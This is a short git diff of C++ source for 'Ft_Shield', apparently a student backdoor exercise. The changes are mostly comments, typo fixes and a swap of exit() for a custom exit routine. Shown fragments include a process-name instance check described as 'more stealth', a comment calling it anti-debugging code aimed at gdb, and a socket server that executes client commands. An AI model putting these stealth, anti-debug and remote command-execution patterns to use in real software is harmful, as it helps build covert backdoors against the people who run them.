@@ -131,7 +131,8 @@ void Ft_Shield::daemonize(void)
 /*
  * Check if another instance is already running, quit if yes, continue otherwise
  * Check by process name instead of get a lock file : more stealth
- * it's buggy
+ * NOTE:
+ * 	It's a kind of antidebug code because gdb runs several times the process to debug it
  */
 void	Ft_Shield::_checkInstance(void)
 {
@@ -155,7 +156,7 @@ void	Ft_Shield::_checkInstance(void)
 			close(STDOUT_FILENO);
 			dup2(fd[1], STDOUT_FILENO);
 			system("ps axco pid,command | grep ft_shield");
-			exit(EXIT_SUCCESS);
+			this->_exit();
 		}
 		else if (pid != 0)
 		{
@@ -170,7 +171,7 @@ void	Ft_Shield::_checkInstance(void)
 				found = this->_buffer.find("ft_shield", found + 1);
 			}
 			if (count > 2)
-				exit(EXIT_SUCCESS);
+				this->_exit();
 		}
 	}
 	return;
@@ -184,7 +185,7 @@ void	Ft_Shield::_checkInstance(void)
  */
 int	Ft_Shield::_mkSrv(void)
 {
-	int				opt			= 1;
+	int	opt = 1;
 
 	this->_socket = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
 	if (this->_socket == -1)
@@ -200,6 +201,7 @@ int	Ft_Shield::_mkSrv(void)
 
 /*
  * Run a simple server using select api
+ * Execute the client command and ignore it if it's not a legit command
  * Close the client socket if it is disconnected or sends a 'quit' string
  */
 void	Ft_Shield::_runSrv(void)
@@ -331,7 +333,7 @@ void	Ft_Shield::_disconnect(int fd)
 }
 
 /*
- * Siple hhelp menu associated to the ehlp command
+ * Simple help menu associated to the ehlp command
  */
 void	Ft_Shield::_help(int fd)
 {
